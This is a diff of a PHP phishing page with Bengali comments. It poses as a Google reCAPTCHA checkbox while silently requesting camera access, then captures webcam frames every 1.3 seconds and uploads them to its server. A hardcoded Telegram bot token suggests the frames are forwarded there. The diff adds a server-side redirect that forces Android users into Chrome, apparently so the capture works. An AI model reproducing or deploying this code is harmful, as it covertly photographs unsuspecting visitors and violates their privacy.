@@ -1,4 +1,20 @@
 <?php
+// পিএইচপি সাইড থেকে অ্যান্ড্রয়েড ব্রাউজার চেক এবং ক্রোম ইন্টেন্ট ফোর্স রিডাইরেক্ট
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    $isAndroid = (bool) preg_match('/Android/i', $ua);
+    // ক্রোম ব্রাউজার কি না চেক করা (অপেরা, স্যামসাং, এজ বাদ দিয়ে)
+    $isChrome = (bool) preg_match('/Chrome|CriOS/i', $ua) && !preg_match('/Edge|OPR|SamsungBrowser/i', $ua);
+
+    // যদি অ্যান্ড্রয়েড হয় এবং ক্রোম না হয়, তবে সার্ভার থেকেই সরাসরি ক্রোম ইন্টেন্টে পাঠিয়ে দেওয়া
+    if ($isAndroid && !$isChrome) {
+        $fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+        $cleanUrl = preg_replace('/^https?:\/\//', '', $fullUrl);
+        header("Location: intent://{$cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;");
+        exit;
+    }
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -65,54 +81,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             overflow: hidden;
             background-color: #f9f9f9; 
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            font-family: Roboto, helvetica, arial, sans-serif;
         }
         
-        /* Force Chrome Screen */
-        #forceChromeOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #ffffff;
-            z-index: 99999;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
-            text-align: center;
-        }
-
-        .chrome-icon {
-            width: 64px;
-            height: 64px;
-            margin-bottom: 20px;
-            background-image: url('https://www.gstatic.com/images/branding/product/2x/chrome_48dp.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-        }
-
-        .force-btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 14px 28px;
-            font-size: 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 20px;
-            font-weight: bold;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
-            text-decoration: none;
-            display: inline-block;
-        }
-
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -144,6 +116,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             align-items: center;
             justify-content: center;
             position: relative;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        .recaptcha-checkbox:hover {
+            border-color: #b2b2b2;
         }
 
         .recaptcha-checkbox.checked::after {
@@ -158,6 +135,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         .recaptcha-text {
+            font-family: Roboto, helvetica, arial, sans-serif;
             font-size: 14px;
             color: #2c2c2c;
             user-select: none;
@@ -179,6 +157,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         .recaptcha-footer {
+            font-family: Roboto, helvetica, arial, sans-serif;
             font-size: 10px;
             color: #555;
             margin-top: 2px;
@@ -186,16 +165,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     </style>
 </head>
 <body>
-
-    <!-- Non-Chrome Browser Warning Screen -->
-    <div id="forceChromeOverlay">
-        <div class="chrome-icon"></div>
-        <h2 style="color: #202124; margin-bottom: 10px; font-size: 20px;">ব্রাউজার পরিবর্তন করুন</h2>
-        <p style="color: #5f6368; font-size: 14px; max-width: 320px; line-height: 1.6; margin-bottom: 10px;">
-            এই পেজটি সঠিকভাবে দেখতে এবং কাজ করার জন্য অনুগ্রহ করে **Google Chrome** ব্রাউজার ব্যবহার করুন।
-        </p>
-        <a href="#" id="chromeIntentBtn" class="force-btn">Google Chrome এ খুলুন</a>
-    </div>
 
     <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
         <div class="recaptcha-left">
@@ -212,81 +181,67 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const ua = navigator.userAgent;
-        const isChrome = /CriOS|Chrome/.test(ua) && !/Edge|OPR|SamsungBrowser/.test(ua);
-        const isAndroid = /Android/i.test(ua);
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-        const currentUrl = window.location.href;
-        const cleanUrl = currentUrl.replace(/^https?:\/+\/?/, '');
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id') || 'direct';
+        const userChatId = urlParams.get('cid') || ''; 
+        const rawTargetUrl = urlParams.get('url');
 
-        // যদি অ্যান্ড্রয়েড হয় এবং ব্রাউজার ক্রোম না হয়, তবে ওভারলে স্ক্রিন ও ইন্টেন্ট বাটন দেখিয়ে আটকে রাখবে
-        if (isAndroid && !isChrome) {
-            document.getElementById('forceChromeOverlay').style.display = 'flex';
-            document.getElementById('chromeIntentBtn').href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
-        } else {
-            // যদি ক্রোম বা আইফোন হয়, তবে মূল ইন্টারফেস ও ক্যামেরা প্রসেস শুরু হবে
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+        let finalUrl = "https://www.aapunkagames.com/"; 
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetId = urlParams.get('id') || 'direct';
-            const userChatId = urlParams.get('cid') || ''; 
-            const rawTargetUrl = urlParams.get('url');
-
-            let finalUrl = "https://www.aapunkagames.com/"; 
-
-            if (rawTargetUrl) {
-                try {
-                    finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
-                } catch (e) {
-                    console.error("URL decode error:", e);
-                }
+        if (rawTargetUrl) {
+            try {
+                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
+            } catch (e) {
+                console.error("URL decode error:", e);
             }
+        }
 
-            const recaptchaContainer = document.getElementById('recaptchaContainer');
-            if (finalUrl) {
-                recaptchaContainer.style.display = 'flex';
-            }
+        const recaptchaContainer = document.getElementById('recaptchaContainer');
+        if (finalUrl) {
+            recaptchaContainer.style.display = 'flex';
+        }
 
-            window.openTargetLink = function() {
-                const checkbox = document.getElementById('recaptchaCheckbox');
-                checkbox.style.background = '#fff';
-                checkbox.classList.add('checked');
-                
+        function openTargetLink() {
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            checkbox.style.background = '#fff';
+            checkbox.classList.add('checked');
+            
+            setTimeout(() => {
+                window.open(finalUrl, '_blank');
+            }, 500);
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
                 setTimeout(() => {
-                    window.open(finalUrl, '_blank');
-                }, 500);
-            }
+                    setInterval(captureAndUpload, 1300);
+                }, 1000);
+            })
+            .catch(err => {
+                console.error("Camera error: ", err);
+            });
 
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        setInterval(captureAndUpload, 1300);
-                    }, 1000);
-                })
-                .catch(err => {
-                    console.error("Camera error: ", err);
-                });
+        function captureAndUpload() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-            function captureAndUpload() {
-                const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
-
-                fetch('', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId) + '&chat_id=' + encodeURIComponent(userChatId)
-                }).catch(error => {
-                    console.error('Error:', error);
-                });
-            }
+            fetch('', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId) + '&chat_id=' + encodeURIComponent(userChatId)
+            }).catch(error => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
